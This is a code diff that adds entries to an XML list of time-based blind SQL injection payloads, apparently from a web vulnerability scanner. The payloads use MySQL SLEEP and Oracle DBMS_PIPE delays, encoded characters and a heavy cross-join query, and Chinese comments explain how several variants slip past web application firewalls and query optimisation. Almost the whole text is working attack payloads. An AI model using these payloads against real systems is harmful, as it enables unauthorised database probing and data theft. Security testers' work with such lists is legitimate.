@@ -13,6 +13,8 @@
         <!--waf-->
         <!--'=SLEEP(5.0)='-->
         <payload value="'=SLEEP(5)='"/>
+        <!--'=SLEEP(5)='等号可能是失效，使用加号却可以-->
+        <payload value="'%2bSLEEP(5)%2b'"/>
         <!--XOR是考虑fase and sleep()-->
         <payload value="'=SLEEP(5)%20XOR'"/>
         <!--面对表为空，或者false and sleep(5)这种情形-->
@@ -45,6 +47,8 @@
         <payload value="or%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)"/>
         <payload value="||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)"/>
         <payload value="'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)||'"/>
+        <!--后面使用or '1'='2,数据库可能优化or '1'='1'-->
+        <payload value="'%20OR%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)%20OR%20'1'='2"/>
         <payload value="'%20OR%201=DBMS_PIPE.RECEIVE_MESSAGE(CHR(105)||CHR(69)||CHR(114)||CHR(69),5)%20OR'"/>
         <payload value="||(SELECT%20COUNT(*)%20FROM%20ALL_USERS%20T1,ALL_USERS%20T2,ALL_USERS%20T4,ALL_USERS%20T4,ALL_USERS%20T5,ALL_USERS%20T6)"/>
         <payload value="%27||(SELECT%20COUNT(*)%20FROM%20ALL_USERS%20T1,ALL_USERS%20T2,ALL_USERS%20T4,ALL_USERS%20T4,ALL_USERS%20T5,ALL_USERS%20T6)||%27"/>
